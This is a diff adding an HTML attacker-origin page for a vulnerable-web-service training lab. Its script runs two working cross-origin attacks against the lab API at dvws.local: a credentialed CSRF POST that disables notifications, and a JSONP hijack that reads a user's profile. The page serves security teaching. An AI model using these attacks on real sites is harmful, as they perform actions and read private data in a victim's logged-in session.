@@ -1,0 +1,56 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>DVWS Attacker Origin Lab</title>
+  <style>
+    body { font: 16px/1.5 system-ui, sans-serif; max-width: 760px; margin: 3rem auto; padding: 0 1rem; color: #1f2937; }
+    main { border: 1px solid #d1d5db; border-radius: 12px; padding: 1.5rem; }
+    button { padding: .65rem 1rem; border: 0; border-radius: 6px; background: #2563eb; color: white; cursor: pointer; }
+    pre { white-space: pre-wrap; overflow-wrap: anywhere; background: #f3f4f6; padding: 1rem; border-radius: 6px; }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>DVWS Attacker Origin Lab</h1>
+    <p>This page is served from <code>attacker.test</code>, a different origin from the DVWS API.</p>
+    <section id="cookie" hidden>
+      <h2>Credentialed cross-site action</h2>
+      <p>The action attempts to disable synthetic account notifications using the browser's cookie behavior.</p>
+      <button id="send-action">Send cross-origin request</button>
+    </section>
+    <section id="jsonp" hidden>
+      <h2>JSONP profile read</h2>
+      <p>Loading the API as a script lets this page's callback receive the returned profile.</p>
+    </section>
+    <pre id="result" role="status">Choose a challenge from the DVWS app, then open its attacker-origin link.</pre>
+  </main>
+  <script>
+    const result = document.getElementById('result');
+    const challenge = new URLSearchParams(location.search).get('challenge');
+    if (challenge === 'cookie') {
+      document.getElementById('cookie').hidden = false;
+      document.getElementById('send-action').addEventListener('click', async () => {
+        result.textContent = 'Sending request…';
+        try {
+          const response = await fetch('https://dvws.local:8443/api/v2/cookie-lab/action', {
+            method: 'POST', credentials: 'include', headers: { 'Content-Type': 'text/plain' }, body: 'disable-notifications'
+          });
+          const body = await response.json();
+          result.textContent = `HTTP ${response.status}\n${JSON.stringify(body, null, 2)}\n\nIf this succeeds, inspect the chosen SameSite setting and the request cookies.`;
+        } catch (error) {
+          result.textContent = `Browser blocked or could not complete the request: ${error.message}. Check trusted TLS, host mappings, and browser cookie policy.`;
+        }
+      });
+    } else if (challenge === 'jsonp') {
+      document.getElementById('jsonp').hidden = false;
+      window.captureProfile = (data) => { result.textContent = JSON.stringify(data, null, 2); };
+      const script = document.createElement('script');
+      script.src = 'https://dvws.local:8443/api/v2/jsonp-lab/profile?callback=captureProfile';
+      script.onerror = () => { result.textContent = 'The JSONP script did not load. Create a lab session and check TLS and cookie policy.'; };
+      document.head.appendChild(script);
+    }
+  </script>
+</body>
+</html>
